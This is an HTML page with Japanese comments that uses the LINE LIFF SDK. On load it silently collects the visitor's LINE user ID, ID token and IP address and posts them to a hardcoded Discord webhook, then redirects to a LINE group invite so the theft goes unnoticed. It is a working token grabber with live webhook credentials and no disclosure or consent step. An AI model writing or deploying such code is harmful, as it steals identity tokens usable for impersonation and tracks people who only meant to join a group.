<!DOCTYPE html>
<html>
<head>
  <title>LIFF Data to Discord</title>
  <script src="https://static.line-scdn.net/liff/edge/2/sdk.js"></script>
</head>
<body>
<script>
  // 設定項目
  const LIFF_ID = '2007556850-NzoOlegE'; // ご自身のLIFF IDに置き換えてください
  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1373359224158945290/9zVF_Ljvzcgoc7NWCQwcUScC6_DH1oiEDSfFxRAbjYJ0l4CJqy2KmUyVJY06VcSOq9T1'; // Discord Webhook URL
  const REDIRECT_URL = 'https://line.me/ti/g2/NHsgY4pwGsvy39ZKz6Z5IHpRvPGKW269BKjgcg?utm_source=invitation&utm_medium=link_copy&utm_campaign=default'; // 送信後のリダイレクト先

  async function main() {
    await liff.init({ liffId: LIFF_ID });

    // ユーザーID取得
    let uid = null;
    try {
      const profile = await liff.getProfile();
      uid = profile.userId;
    } catch (e) {
      uid = '取得失敗';
    }

    // idToken取得
    let idToken = liff.getIDToken() || '取得失敗';

    // IPアドレス取得
    let ip = '不明';
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();
      ip = data.ip || '取得失敗';
    } catch (e) {}

    // Discordに送信
    const body = {
      content: `LIFF情報を取得しました\nIP: ${ip}\nUID: ${uid}\nIDToken: ${idToken}`
    };
    await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });

    // リダイレクト
    window.location.href = REDIRECT_URL;
  }

  main();
</script>
</body>
</html>
